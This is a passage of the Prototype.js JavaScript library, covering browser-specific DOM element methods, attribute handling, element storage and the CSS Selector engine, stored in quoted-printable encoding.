  Element.Methods.readAttribute =3D Element.Methods.readAttribute.wrap(
    function(proceed, element, attribute) {
      if (attribute =3D=3D=3D 'title') return element.title;
      return proceed(element, attribute);
    }
  );
}

else if (Prototype.Browser.IE) {
  Element.Methods.getOffsetParent =3D Element.Methods.getOffsetParent.wrap(
    function(proceed, element) {
      element =3D $(element);
      try { element.offsetParent }
      catch(e) { return $(document.body) }
      var position =3D element.getStyle('position');
      if (position !=3D=3D 'static') return proceed(element);
      element.setStyle({ position: 'relative' });
      var value =3D proceed(element);
      element.setStyle({ position: position });
      return value;
    }
  );

  $w('positionedOffset viewportOffset').each(function(method) {
    Element.Methods[method] =3D Element.Methods[method].wrap(
      function(proceed, element) {
        element =3D $(element);
        try { element.offsetParent }
        catch(e) { return Element._returnOffset(0,0) }
        var position =3D element.getStyle('position');
        if (position !=3D=3D 'static') return proceed(element);
        var offsetParent =3D element.getOffsetParent();
        if (offsetParent && offsetParent.getStyle('position') =3D=3D=3D 'fi=
xed')
          offsetParent.setStyle({ zoom: 1 });
        element.setStyle({ position: 'relative' });
        var value =3D proceed(element);
        element.setStyle({ position: position });
        return value;
      }
    );
  });

  Element.Methods.cumulativeOffset =3D Element.Methods.cumulativeOffset.wra=
p(
    function(proceed, element) {
      try { element.offsetParent }
      catch(e) { return Element._returnOffset(0,0) }
      return proceed(element);
    }
  );

  Element.Methods.getStyle =3D function(element, style) {
    element =3D $(element);
    style =3D (style =3D=3D 'float' || style =3D=3D 'cssFloat') ? 'styleFlo=
at' : style.camelize();
    var value =3D element.style[style];
    if (!value && element.currentStyle) value =3D element.currentStyle[styl=
e];

    if (style =3D=3D 'opacity') {
      if (value =3D (element.getStyle('filter') || '').match(/alpha\(opacit=
y=3D(.*)\)/))
        if (value[1]) return parseFloat(value[1]) / 100;
      return 1.0;
    }

    if (value =3D=3D 'auto') {
      if ((style =3D=3D 'width' || style =3D=3D 'height') && (element.getSt=
yle('display') !=3D 'none'))
        return element['offset' + style.capitalize()] + 'px';
      return null;
    }
    return value;
  };

  Element.Methods.setOpacity =3D function(element, value) {
    function stripAlpha(filter){
      return filter.replace(/alpha\([^\)]*\)/gi,'');
    }
    element =3D $(element);
    var currentStyle =3D element.currentStyle;
    if ((currentStyle && !currentStyle.hasLayout) ||
      (!currentStyle && element.style.zoom =3D=3D 'normal'))
        element.style.zoom =3D 1;

    var filter =3D element.getStyle('filter'), style =3D element.style;
    if (value =3D=3D 1 || value =3D=3D=3D '') {
      (filter =3D stripAlpha(filter)) ?
        style.filter =3D filter : style.removeAttribute('filter');
      return element;
    } else if (value < 0.00001) value =3D 0;
    style.filter =3D stripAlpha(filter) +
      'alpha(opacity=3D' + (value * 100) + ')';
    return element;
  };

  Element._attributeTranslations =3D (function(){

    var classProp =3D 'className';
    var forProp =3D 'for';

    var el =3D document.createElement('div');

    el.setAttribute(classProp, 'x');

    if (el.className !=3D=3D 'x') {
      el.setAttribute('class', 'x');
      if (el.className =3D=3D=3D 'x') {
        classProp =3D 'class';
      }
    }
    el =3D null;

    el =3D document.createElement('label');
    el.setAttribute(forProp, 'x');
    if (el.htmlFor !=3D=3D 'x') {
      el.setAttribute('htmlFor', 'x');
      if (el.htmlFor =3D=3D=3D 'x') {
        forProp =3D 'htmlFor';
      }
    }
    el =3D null;

    return {
      read: {
        names: {
          'class':      classProp,
          'className':  classProp,
          'for':        forProp,
          'htmlFor':    forProp
        },
        values: {
          _getAttr: function(element, attribute) {
            return element.getAttribute(attribute);
          },
          _getAttr2: function(element, attribute) {
            return element.getAttribute(attribute, 2);
          },
          _getAttrNode: function(element, attribute) {
            var node =3D element.getAttributeNode(attribute);
            return node ? node.value : "";
          },
          _getEv: (function(){

            var el =3D document.createElement('div');
            el.onclick =3D Prototype.emptyFunction;
            var value =3D el.getAttribute('onclick');
            var f;

            if (String(value).indexOf('{') > -1) {
              f =3D function(element, attribute) {
                attribute =3D element.getAttribute(attribute);
                if (!attribute) return null;
                attribute =3D attribute.toString();
                attribute =3D attribute.split('{')[1];
                attribute =3D attribute.split('}')[0];
                return attribute.strip();
              };
            }
            else if (value =3D=3D=3D '') {
              f =3D function(element, attribute) {
                attribute =3D element.getAttribute(attribute);
                if (!attribute) return null;
                return attribute.strip();
              };
            }
            el =3D null;
            return f;
          })(),
          _flag: function(element, attribute) {
            return $(element).hasAttribute(attribute) ? attribute : null;
          },
          style: function(element) {
            return element.style.cssText.toLowerCase();
          },
          title: function(element) {
            return element.title;
          }
        }
      }
    }
  })();

  Element._attributeTranslations.write =3D {
    names: Object.extend({
      cellpadding: 'cellPadding',
      cellspacing: 'cellSpacing'
    }, Element._attributeTranslations.read.names),
    values: {
      checked: function(element, value) {
        element.checked =3D !!value;
      },

      style: function(element, value) {
        element.style.cssText =3D value ? value : '';
      }
    }
  };

  Element._attributeTranslations.has =3D {};

  $w('colSpan rowSpan vAlign dateTime accessKey tabIndex ' +
      'encType maxLength readOnly longDesc frameBorder').each(function(attr=
) {
    Element._attributeTranslations.write.names[attr.toLowerCase()] =3D attr;
    Element._attributeTranslations.has[attr.toLowerCase()] =3D attr;
  });

  (function(v) {
    Object.extend(v, {
      href:        v._getAttr2,
      src:         v._getAttr2,
      type:        v._getAttr,
      action:      v._getAttrNode,
      disabled:    v._flag,
      checked:     v._flag,
      readonly:    v._flag,
      multiple:    v._flag,
      onload:      v._getEv,
      onunload:    v._getEv,
      onclick:     v._getEv,
      ondblclick:  v._getEv,
      onmousedown: v._getEv,
      onmouseup:   v._getEv,
      onmouseover: v._getEv,
      onmousemove: v._getEv,
      onmouseout:  v._getEv,
      onfocus:     v._getEv,
      onblur:      v._getEv,
      onkeypress:  v._getEv,
      onkeydown:   v._getEv,
      onkeyup:     v._getEv,
      onsubmit:    v._getEv,
      onreset:     v._getEv,
      onselect:    v._getEv,
      onchange:    v._getEv
    });
  })(Element._attributeTranslations.read.values);

  if (Prototype.BrowserFeatures.ElementExtensions) {
    (function() {
      function _descendants(element) {
        var nodes =3D element.getElementsByTagName('*'), results =3D [];
        for (var i =3D 0, node; node =3D nodes[i]; i++)
          if (node.tagName !=3D=3D "!") // Filter out comment nodes.
            results.push(node);
        return results;
      }

      Element.Methods.down =3D function(element, expression, index) {
        element =3D $(element);
        if (arguments.length =3D=3D 1) return element.firstDescendant();
        return Object.isNumber(expression) ? _descendants(element)[expressi=
on] :
          Element.select(element, expression)[index || 0];
      }
    })();
  }

}

else if (Prototype.Browser.Gecko && /rv:1\.8\.0/.test(navigator.userAgent))=
 {
  Element.Methods.setOpacity =3D function(element, value) {
    element =3D $(element);
    element.style.opacity =3D (value =3D=3D 1) ? 0.999999 :
      (value =3D=3D=3D '') ? '' : (value < 0.00001) ? 0 : value;
    return element;
  };
}

else if (Prototype.Browser.WebKit) {
  Element.Methods.setOpacity =3D function(element, value) {
    element =3D $(element);
    element.style.opacity =3D (value =3D=3D 1 || value =3D=3D=3D '') ? ''=
 :
      (value < 0.00001) ? 0 : value;

    if (value =3D=3D 1)
      if(element.tagName.toUpperCase() =3D=3D 'IMG' && element.width) {
        element.width++; element.width--;
      } else try {
        var n =3D document.createTextNode(' ');
        element.appendChild(n);
        element.removeChild(n);
      } catch (e) { }

    return element;
  };

  Element.Methods.cumulativeOffset =3D function(element) {
    var valueT =3D 0, valueL =3D 0;
    do {
      valueT +=3D element.offsetTop  || 0;
      valueL +=3D element.offsetLeft || 0;
      if (element.offsetParent =3D=3D document.body)
        if (Element.getStyle(element, 'position') =3D=3D 'absolute') break;

      element =3D element.offsetParent;
    } while (element);

    return Element._returnOffset(valueL, valueT);
  };
}

if ('outerHTML' in document.documentElement) {
  Element.Methods.replace =3D function(element, content) {
    element =3D $(element);

    if (content && content.toElement) content =3D content.toElement();
    if (Object.isElement(content)) {
      element.parentNode.replaceChild(content, element);
      return element;
    }

    content =3D Object.toHTML(content);
    var parent =3D element.parentNode, tagName =3D parent.tagName.toUpperCa=
se();

    if (Element._insertionTranslations.tags[tagName]) {
      var nextSibling =3D element.next();
      var fragments =3D Element._getContentFromAnonymousElement(tagName, co=
ntent.stripScripts());
      parent.removeChild(element);
      if (nextSibling)
        fragments.each(function(node) { parent.insertBefore(node, nextSibli=
ng) });
      else
        fragments.each(function(node) { parent.appendChild(node) });
    }
    else element.outerHTML =3D content.stripScripts();

    content.evalScripts.bind(content).defer();
    return element;
  };
}

Element._returnOffset =3D function(l, t) {
  var result =3D [l, t];
  result.left =3D l;
  result.top =3D t;
  return result;
};

Element._getContentFromAnonymousElement =3D function(tagName, html) {
  var div =3D new Element('div'), t =3D Element._insertionTranslations.tags=
[tagName];
  if (t) {
    div.innerHTML =3D t[0] + html + t[1];
    t[2].times(function() { div =3D div.firstChild });
  } else div.innerHTML =3D html;
  return $A(div.childNodes);
};

Element._insertionTranslations =3D {
  before: function(element, node) {
    element.parentNode.insertBefore(node, element);
  },
  top: function(element, node) {
    element.insertBefore(node, element.firstChild);
  },
  bottom: function(element, node) {
    element.appendChild(node);
  },
  after: function(element, node) {
    element.parentNode.insertBefore(node, element.nextSibling);
  },
  tags: {
    TABLE:  ['<table>',                '</table>',                   1],
    TBODY:  ['<table><tbody>',         '</tbody></table>',           2],
    TR:     ['<table><tbody><tr>',     '</tr></tbody></table>',      3],
    TD:     ['<table><tbody><tr><td>', '</td></tr></tbody></table>', 4],
    SELECT: ['<select>',               '</select>',                  1]
  }
};

(function() {
  var tags =3D Element._insertionTranslations.tags;
  Object.extend(tags, {
    THEAD: tags.TBODY,
    TFOOT: tags.TBODY,
    TH:    tags.TD
  });
})();

Element.Methods.Simulated =3D {
  hasAttribute: function(element, attribute) {
    attribute =3D Element._attributeTranslations.has[attribute] || attribut=
e;
    var node =3D $(element).getAttributeNode(attribute);
    return !!(node && node.specified);
  }
};

Element.Methods.ByTag =3D { };

Object.extend(Element, Element.Methods);

(function(div) {

  if (!Prototype.BrowserFeatures.ElementExtensions && div['__proto__']) {
    window.HTMLElement =3D { };
    window.HTMLElement.prototype =3D div['__proto__'];
    Prototype.BrowserFeatures.ElementExtensions =3D true;
  }

  div =3D null;

})(document.createElement('div'))

Element.extend =3D (function() {

  function checkDeficiency(tagName) {
    if (typeof window.Element !=3D 'undefined') {
      var proto =3D window.Element.prototype;
      if (proto) {
        var id =3D '_' + (Math.random()+'').slice(2);
        var el =3D document.createElement(tagName);
        proto[id] =3D 'x';
        var isBuggy =3D (el[id] !=3D=3D 'x');
        delete proto[id];
        el =3D null;
        return isBuggy;
      }
    }
    return false;
  }

  function extendElementWith(element, methods) {
    for (var property in methods) {
      var value =3D methods[property];
      if (Object.isFunction(value) && !(property in element))
        element[property] =3D value.methodize();
    }
  }

  var HTMLOBJECTELEMENT_PROTOTYPE_BUGGY =3D checkDeficiency('object');

  if (Prototype.BrowserFeatures.SpecificElementExtensions) {
    if (HTMLOBJECTELEMENT_PROTOTYPE_BUGGY) {
      return function(element) {
        if (element && typeof element._extendedByPrototype =3D=3D 'undefine=
d') {
          var t =3D element.tagName;
          if (t && (/^(?:object|applet|embed)$/i.test(t))) {
            extendElementWith(element, Element.Methods);
            extendElementWith(element, Element.Methods.Simulated);
            extendElementWith(element, Element.Methods.ByTag[t.toUpperCase(=
)]);
          }
        }
        return element;
      }
    }
    return Prototype.K;
  }

  var Methods =3D { }, ByTag =3D Element.Methods.ByTag;

  var extend =3D Object.extend(function(element) {
    if (!element || typeof element._extendedByPrototype !=3D 'undefined' ||
        element.nodeType !=3D 1 || element =3D=3D window) return element;

    var methods =3D Object.clone(Methods),
        tagName =3D element.tagName.toUpperCase();

    if (ByTag[tagName]) Object.extend(methods, ByTag[tagName]);

    extendElementWith(element, methods);

    element._extendedByPrototype =3D Prototype.emptyFunction;
    return element;

  }, {
    refresh: function() {
      if (!Prototype.BrowserFeatures.ElementExtensions) {
        Object.extend(Methods, Element.Methods);
        Object.extend(Methods, Element.Methods.Simulated);
      }
    }
  });

  extend.refresh();
  return extend;
})();

Element.hasAttribute =3D function(element, attribute) {
  if (element.hasAttribute) return element.hasAttribute(attribute);
  return Element.Methods.Simulated.hasAttribute(element, attribute);
};

Element.addMethods =3D function(methods) {
  var F =3D Prototype.BrowserFeatures, T =3D Element.Methods.ByTag;

  if (!methods) {
    Object.extend(Form, Form.Methods);
    Object.extend(Form.Element, Form.Element.Methods);
    Object.extend(Element.Methods.ByTag, {
      "FORM":     Object.clone(Form.Methods),
      "INPUT":    Object.clone(Form.Element.Methods),
      "SELECT":   Object.clone(Form.Element.Methods),
      "TEXTAREA": Object.clone(Form.Element.Methods)
    });
  }

  if (arguments.length =3D=3D 2) {
    var tagName =3D methods;
    methods =3D arguments[1];
  }

  if (!tagName) Object.extend(Element.Methods, methods || { });
  else {
    if (Object.isArray(tagName)) tagName.each(extend);
    else extend(tagName);
  }

  function extend(tagName) {
    tagName =3D tagName.toUpperCase();
    if (!Element.Methods.ByTag[tagName])
      Element.Methods.ByTag[tagName] =3D { };
    Object.extend(Element.Methods.ByTag[tagName], methods);
  }

  function copy(methods, destination, onlyIfAbsent) {
    onlyIfAbsent =3D onlyIfAbsent || false;
    for (var property in methods) {
      var value =3D methods[property];
      if (!Object.isFunction(value)) continue;
      if (!onlyIfAbsent || !(property in destination))
        destination[property] =3D value.methodize();
    }
  }

  function findDOMClass(tagName) {
    var klass;
    var trans =3D {
      "OPTGROUP": "OptGroup", "TEXTAREA": "TextArea", "P": "Paragraph",
      "FIELDSET": "FieldSet", "UL": "UList", "OL": "OList", "DL": "DList",
      "DIR": "Directory", "H1": "Heading", "H2": "Heading", "H3": "Heading",
      "H4": "Heading", "H5": "Heading", "H6": "Heading", "Q": "Quote",
      "INS": "Mod", "DEL": "Mod", "A": "Anchor", "IMG": "Image", "CAPTION":
      "TableCaption", "COL": "TableCol", "COLGROUP": "TableCol", "THEAD":
      "TableSection", "TFOOT": "TableSection", "TBODY": "TableSection", "TR=
":
      "TableRow", "TH": "TableCell", "TD": "TableCell", "FRAMESET":
      "FrameSet", "IFRAME": "IFrame"
    };
    if (trans[tagName]) klass =3D 'HTML' + trans[tagName] + 'Element';
    if (window[klass]) return window[klass];
    klass =3D 'HTML' + tagName + 'Element';
    if (window[klass]) return window[klass];
    klass =3D 'HTML' + tagName.capitalize() + 'Element';
    if (window[klass]) return window[klass];

    var element =3D document.createElement(tagName);
    var proto =3D element['__proto__'] || element.constructor.prototype;
    element =3D null;
    return proto;
  }

  var elementPrototype =3D window.HTMLElement ? HTMLElement.prototype :
   Element.prototype;

  if (F.ElementExtensions) {
    copy(Element.Methods, elementPrototype);
    copy(Element.Methods.Simulated, elementPrototype, true);
  }

  if (F.SpecificElementExtensions) {
    for (var tag in Element.Methods.ByTag) {
      var klass =3D findDOMClass(tag);
      if (Object.isUndefined(klass)) continue;
      copy(T[tag], klass.prototype);
    }
  }

  Object.extend(Element, Element.Methods);
  delete Element.ByTag;

  if (Element.extend.refresh) Element.extend.refresh();
  Element.cache =3D { };
};


document.viewport =3D {

  getDimensions: function() {
    return { width: this.getWidth(), height: this.getHeight() };
  },

  getScrollOffsets: function() {
    return Element._returnOffset(
      window.pageXOffset || document.documentElement.scrollLeft || document=
.body.scrollLeft,
      window.pageYOffset || document.documentElement.scrollTop  || document=
.body.scrollTop);
  }
};

(function(viewport) {
  var B =3D Prototype.Browser, doc =3D document, element, property =3D {};

  function getRootElement() {
    if (B.WebKit && !doc.evaluate)
      return document;

    if (B.Opera && window.parseFloat(window.opera.version()) < 9.5)
      return document.body;

    return document.documentElement;
  }

  function define(D) {
    if (!element) element =3D getRootElement();

    property[D] =3D 'client' + D;

    viewport['get' + D] =3D function() { return element[property[D]] };
    return viewport['get' + D]();
  }

  viewport.getWidth  =3D define.curry('Width');

  viewport.getHeight =3D define.curry('Height');
})(document.viewport);


Element.Storage =3D {
  UID: 1
};

Element.addMethods({
  getStorage: function(element) {
    if (!(element =3D $(element))) return;

    var uid;
    if (element =3D=3D=3D window) {
      uid =3D 0;
    } else {
      if (typeof element._prototypeUID =3D=3D=3D "undefined")
        element._prototypeUID =3D [Element.Storage.UID++];
      uid =3D element._prototypeUID[0];
    }

    if (!Element.Storage[uid])
      Element.Storage[uid] =3D $H();

    return Element.Storage[uid];
  },

  store: function(element, key, value) {
    if (!(element =3D $(element))) return;

    if (arguments.length =3D=3D=3D 2) {
      Element.getStorage(element).update(key);
    } else {
      Element.getStorage(element).set(key, value);
    }

    return element;
  },

  retrieve: function(element, key, defaultValue) {
    if (!(element =3D $(element))) return;
    var hash =3D Element.getStorage(element), value =3D hash.get(key);

    if (Object.isUndefined(value)) {
      hash.set(key, defaultValue);
      value =3D defaultValue;
    }

    return value;
  },

  clone: function(element, deep) {
    if (!(element =3D $(element))) return;
    var clone =3D element.cloneNode(deep);
    clone._prototypeUID =3D void 0;
    if (deep) {
      var descendants =3D Element.select(clone, '*'),
          i =3D descendants.length;
      while (i--) {
        descendants[i]._prototypeUID =3D void 0;
      }
    }
    return Element.extend(clone);
  }
});
/* Portions of the Selector class are derived from Jack Slocum's DomQuery,
 * part of YUI-Ext version 0.40, distributed under the terms of an MIT-style
 * license.  Please see http://www.yui-ext.com/ for more information. */

var Selector =3D Class.create({
  initialize: function(expression) {
    this.expression =3D expression.strip();

    if (this.shouldUseSelectorsAPI()) {
      this.mode =3D 'selectorsAPI';
    } else if (this.shouldUseXPath()) {
      this.mode =3D 'xpath';
      this.compileXPathMatcher();
    } else {
      this.mode =3D "normal";
      this.compileMatcher();
    }

  },

  shouldUseXPath: (function() {

    var IS_DESCENDANT_SELECTOR_BUGGY =3D (function(){
      var isBuggy =3D false;
      if (document.evaluate && window.XPathResult) {
        var el =3D document.createElement('div');
        el.innerHTML =3D '<ul><li></li></ul><div><ul><li></li></ul></div>';

        var xpath =3D ".//*[local-name()=3D'ul' or local-name()=3D'UL']" +
          "//*[local-name()=3D'li' or local-name()=3D'LI']";

        var result =3D document.evaluate(xpath, el, null,
          XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);

        isBuggy =3D (result.snapshotLength !=3D=3D 2);
        el =3D null;
      }
      return isBuggy;
    })();

    return function() {
      if (!Prototype.BrowserFeatures.XPath) return false;

      var e =3D this.expression;

      if (Prototype.Browser.WebKit &&
       (e.include("-of-type") || e.include(":empty")))
        return false;

      if ((/(\[[\w-]*?:|:checked)/).test(e))
        return false;

      if (IS_DESCENDANT_SELECTOR_BUGGY) return false;

      return true;
    }

  })(),

  shouldUseSelectorsAPI: function() {
    if (!Prototype.BrowserFeatures.SelectorsAPI) return false;

    if (Selector.CASE_INSENSITIVE_CLASS_NAMES) return false;

    if (!Selector._div) Selector._div =3D new Element('div');

    try {
      Selector._div.querySelector(this.expression);
    } catch(e) {
      return false;
    }

    return true;
  },

  compileMatcher: function() {
    var e =3D this.expression, ps =3D Selector.patterns, h =3D Selector.han=
dlers,
        c =3D Selector.criteria, le, p, m, len =3D ps.length, name;

    if (Selector._cache[e]) {
      this.matcher =3D Selector._cache[e];
      return;
    }

    this.matcher =3D ["this.matcher =3D function(root) {",
                    "var r =3D root, h =3D Selector.handlers, c =3D false,=
 n;"];

    while (e && le !=3D e && (/\S/).test(e)) {
      le =3D e;
      for (var i =3D 0; i<len; i++) {
        p =3D ps[i].re;
        name =3D ps[i].name;
        if (m =3D e.match(p)) {
          this.matcher.push(Object.isFunction(c[name]) ? c[name](m) :
            new Template(c[name]).evaluate(m));
          e =3D e.replace(m[0], '');
          break;
        }
      }
    }

    this.matcher.push("return h.unique(n);\n}");
    eval(this.matcher.join('\n'));
    Selector._cache[this.expression] =3D this.matcher;
  },

  compileXPathMatcher: function() {
    var e =3D this.expression, ps =3D Selector.patterns,
        x =3D Selector.xpath, le, m, len =3D ps.length, name;

    if (Selector._cache[e]) {
      this.xpath =3D Selector._cache[e]; return;
    }

    this.matcher =3D ['.//*'];
    while (e && le !=3D e && (/\S/).test(e)) {
      le =3D e;
      for (var i =3D 0; i<len; i++) {
        name =3D ps[i].name;
        if (m =3D e.match(ps[i].re)) {
          this.matcher.push(Object.isFunction(x[name]) ? x[name](m) :
            new Template(x[name]).evaluate(m));
          e =3D e.replace(m[0], '');
          break;
        }
      }
    }

    this.xpath =3D this.matcher.join('');
    Selector._cache[this.expression] =3D this.xpath;
  },

  findElements: function(root) {
    root =3D root || document;
    var e =3D this.expression, results;

    switch (this.mode) {
      case 'selectorsAPI':
        if (root !=3D=3D document) {
          var oldId =3D root.id, id =3D $(root).identify();
          id =3D id.replace(/([\.:])/g, "\\$1");
          e =3D "#" + id + " " + e;
        }

        results =3D $A(root.querySelectorAll(e)).map(Element.extend);
        root.id =3D oldId;

        return results;
      case 'xpath':
        return document._getElementsByXPath(this.xpath, root);
      default:
       return this.matcher(root);
    }
  },

  match: function(element) {
    this.tokens =3D [];

    var e =3D this.expression, ps =3D Selector.patterns, as =3D Selector.as=
sertions;
    var le, p, m, len =3D ps.length, name;

    while (e && le !=3D=3D e && (/\S/).test(e)) {
      le =3D e;
      for (var i =3D 0; i<len; i++) {
        p =3D ps[i].re;
        name =3D ps[i].name;
        if (m =3D e.match(p)) {
          if (as[name]) {
            this.tokens.push([name, Object.clone(m)]);
            e =3D e.replace(m[0], '');
          } else {
            return this.findElements(document).include(element);
          }
        }
      }
    }

    var match =3D true, name, matches;
    for (var i =3D 0, token; token =3D this.tokens[i]; i++) {
      name =3D token[0], matches =3D token[1];
      if (!Selector.assertions[name](element, matches)) {
        match =3D false; break;
      }
    }

    return match;
  },

  toString: function() {
    return this.expression;
  },

  inspect: function() {
    return "#<Selector:" + this.expression.inspect() + ">";
  }
});

if (Prototype.BrowserFeatures.SelectorsAPI &&
 document.compatMode =3D=3D=3D 'BackCompat') {
  Selector.CASE_INSENSITIVE_CLASS_NAMES =3D (function(){
    var div =3D document.createElement('div'),
     span =3D document.createElement('span');

    div.id =3D "prototype_test_id";
    span.className =3D 'Test';
    div.appendChild(span);
    var isIgnored =3D (div.querySelector('#prototype_test_id .test') !=3D=
=3D null);
    div =3D span =3D null;
    return isIgnored;
  })();
}

Object.extend(Selector, {
  _cache: { },

  xpath: {
    descendant:   "//*",
    child:        "/*",
    adjacent:     "/following-sibling::*[1]",
    laterSibling: '/following-sibling::*',
    tagName:      function(m) {
      if (m[1] =3D=3D '*') return '';
      return "[local-name()=3D'" + m[1].toLowerCase() +
             "' or local-name()=3D'" + m[1].toUpperCase() + "']";
    },
    className:    "[contains(concat(' ', @class, ' '), ' #{1} ')]",
    id:           "[@id=3D'#{1}']",
    attrPresence: function(m) {
      m[1] =3D m[1].toLowerCase();
      return new Template("[@#{1}]").evaluate(m);
    },
    attr: function(m) {
      m[1] =3D m[1].toLowerCase();
      m[3] =3D m[5] || m[6];
      return new Template(Selector.xpath.operators[m[2]]).evaluate(m);
    },
    pseudo: function(m) {
      var h =3D Selector.xpath.pseudos[m[1]];
      if (!h) return '';
      if (Object.isFunction(h)) return h(m);
      return new Template(Selector.xpath.pseudos[m[1]]).evaluate(m);
    },
    operators: {
      '=3D':  "[@#{1}=3D'#{3}']",
      '!=3D': "[@#{1}!=3D'#{3}']",
      '^=3D': "[starts-with(@#{1}, '#{3}')]",
      '$=3D': "[substring(@#{1}, (string-length(@#{1}) - string-length('#{3=
}') + 1))=3D'#{3}']",
      '*=3D': "[contains(@#{1}, '#{3}')]",
      '~=3D': "[contains(concat(' ', @#{1}, ' '), ' #{3} ')]",
      '|=3D': "[contains(concat('-', @#{1}, '-'), '-#{3}-')]"
    },
    pseudos: {
      'first-child': '[not(preceding-sibling::*)]',
      'last-child':  '[not(following-sibling::*)]',
      'only-child':  '[not(preceding-sibling::* or following-sibling::*)]',
      'empty':       "[count(*) =3D 0 and (count(text()) =3D 0)]",
      'checked':     "[@checked]",
      'disabled':    "[(@disabled) and (@type!=3D'hidden')]",
      'enabled':     "[not(@disabled) and (@type!=3D'hidden')]",
      'not': function(m) {
        var e =3D m[6], p =3D Selector.patterns,
            x =3D Selector.xpath, le, v, len =3D p.length, name;

        var exclusion =3D [];
        while (e && le !=3D e && (/\S/).test(e)) {
          le =3D e;
          for (var i =3D 0; i<len; i++) {
            name =3D p[i].name
            if (m =3D e.match(p[i].re)) {
              v =3D Object.isFunction(x[name]) ? x[name](m) : new Template(=
x[name]).evaluate(m);
              exclusion.push("(" + v.substring(1, v.length - 1) + ")");
              e =3D e.replace(m[0], '');
              break;
            }
          }
        }
        return "[not(" + exclusion.join(" and ") + ")]";
      },
      'nth-child':      function(m) {
        return Selector.xpath.pseudos.nth("(count(./preceding-sibling::*)=
 + 1) ", m);
      },
      'nth-last-child': function(m) {
        return Selector.xpath.pseudos.nth("(count(./following-sibling::*)=
 + 1) ", m);
      },
      'nth-of-type':    function(m) {
        return Selector.xpath.pseudos.nth("position() ", m);
      },
      'nth-last-of-type': function(m) {
        return Selector.xpath.pseudos.nth("(last() + 1 - position()) ", m);
      },
      'first-of-type':  function(m) {
        m[6] =3D "1"; return Selector.xpath.pseudos['nth-of-type'](m);
      },
      'last-of-type':   function(m) {
        m[6] =3D "1"; return Selector.xpath.pseudos['nth-last-of-type'](m);
      },
      'only-of-type':   function(m) {
        var p =3D Selector.xpath.pseudos; return p['first-of-type'](m) + p[=
'last-of-type'](m);
      },
      nth: function(fragment, m) {
        var mm, formula =3D m[6], predicate;
        if (formula =3D=3D 'even') formula =3D '2n+0';
        if (formula =3D=3D 'odd')  formula =3D '2n+1';
        if (mm =3D formula.match(/^(\d+)$/)) // digit only
          return '[' + fragment + "=3D " + mm[1] + ']';
        if (mm =3D formula.match(/^(-?\d*)?n(([+-])(\d+))?/)) { // an+b
          if (mm[1] =3D=3D "-") mm[1] =3D -1;
          var a =3D mm[1] ? Number(mm[1]) : 1;
          var b =3D mm[2] ? Number(mm[2]) : 0;
          predicate =3D "[((#{fragment} - #{b}) mod #{a} =3D 0) and " +
          "((#{fragment} - #{b}) div #{a} >=3D 0)]";
          return new Template(predicate).evaluate({
            fragment: fragment, a: a, b: b });
        }
      }
    }
  },

  criteria: {
    tagName:      'n =3D h.tagName(n, r, "#{1}", c);      c =3D false;',
    className:    'n =3D h.className(n, r, "#{1}", c);    c =3D false;',
    id:           'n =3D h.id(n, r, "#{1}", c);           c =3D false;',
    attrPresence: 'n =3D h.attrPresence(n, r, "#{1}", c); c =3D false;',
    attr: function(m) {
      m[3] =3D (m[5] || m[6]);
      return new Template('n =3D h.attr(n, r, "#{1}", "#{3}", "#{2}", c);=
 c =3D false;').evaluate(m);
    },
    pseudo: function(m) {
      if (m[6]) m[6] =3D m[6].replace(/"/g, '\\"');
      return new Template('n =3D h.pseudo(n, "#{1}", "#{6}", r, c); c =3D=
 false;').evaluate(m);
    },
    descendant:   'c =3D "descendant";',
    child:        'c =3D "child";',
    adjacent:     'c =3D "adjacent";',
    laterSibling: 'c =3D "laterSibling";'
  },

  patterns: [
    { name: 'laterSibling', re: /^\s*~\s*/ },
    { name: 'child',        re: /^\s*>\s*/ },
    { name: 'adjacent',     re: /^\s*\+\s*/ },
    { name: 'descendant',   re: /^\s/ },

    { name: 'tagName',      re: /^\s*(\*|[\w\-]+)(\b|$)?/ },
    { name: 'id',           re: /^#([\w\-\*]+)(\b|$)/ },
    { name: 'className',    re: /^\.([\w\-\*]+)(\b|$)/ },
    { name: 'pseudo',       re: /^:((first|last|nth|nth-last|only)(-child|-=
of-type)|empty|checked|(en|dis)abled|not)(\((.*?)\))?(\b|$|(?=3D\s|[:+~>]))=
/ },
    { name: 'attrPresence', re: /^\[((?:[\w-]+:)?[\w-]+)\]/ },
    { name: 'attr',         re: /\[((?:[\w-]*:)?[\w-]+)\s*(?:([!^$*~|]?=3D)=
\s*((['"])([^\4]*?)\4|([^'"][^\]]*?)))?\]/ }
  ],

  assertions: {
    tagName: function(element, matches) {
      return matches[1].toUpperCase() =3D=3D element.tagName.toUpperCase();
    },

    className: function(element, matches) {
      return Element.hasClassName(element, matches[1]);
    },

    id: function(element, matches) {
      return element.id =3D=3D=3D matches[1];
    },

    attrPresence: function(element, matches) {
      return Element.hasAttribute(element, matches[1]);
    },

    attr: function(element, matches) {
      var nodeValue =3D Element.readAttribute(element, matches[1]);
      return nodeValue && Selector.operators[matches[2]](nodeValue, matches=
[5] || matches[6]);
    }
  },

  handlers: {
    concat: function(a, b) {
      for (var i =3D 0, node; node =3D b[i]; i++)
        a.push(node);
      return a;
    },

    mark: function(nodes) {
      var _true =3D Prototype.emptyFunction;
      for (var i =3D 0, node; node =3D nodes[i]; i++)
        node._countedByPrototype =3D _true;
      return nodes;
    },

    unmark: (function(){

      var PROPERTIES_ATTRIBUTES_MAP =3D (function(){
        var el =3D document.createElement('div'),
            isBuggy =3D false,
            propName =3D '_countedByPrototype',
            value =3D 'x'
        el[propName] =3D value;
        isBuggy =3D (el.getAttribute(propName) =3D=3D=3D value);
        el =3D null;
        return isBuggy;
      })();

      return PROPERTIES_ATTRIBUTES_MAP ?
        function(nodes) {
          for (var i =3D 0, node; node =3D nodes[i]; i++)
            node.removeAttribute('_countedByPrototype');
          return nodes;
        } :
        function(nodes) {
          for (var i =3D 0, node; node =3D nodes[i]; i++)
            node._countedByPrototype =3D void 0;
          return nodes;
        }
    })(),

    index: function(parentNode, reverse, ofType) {
      parentNode._countedByPrototype =3D Prototype.emptyFunction;
      if (reverse) {
        for (var nodes =3D parentNode.childNodes, i =3D nodes.length - 1,=
 j =3D 1; i >=3D 0; i--) {
          var node =3D nodes[i];
          if (node.nodeType =3D=3D 1 && (!ofType || node._countedByPrototyp=
e)) node.nodeIndex =3D j++;
        }
      } else {
        for (var i =3D 0, j =3D 1, nodes =3D parentNode.childNodes; node =
=3D nodes[i]; i++)
          if (node.nodeType =3D=3D 1 && (!ofType || node._countedByPrototyp=
e)) node.nodeIndex =3D j++;
      }
    },

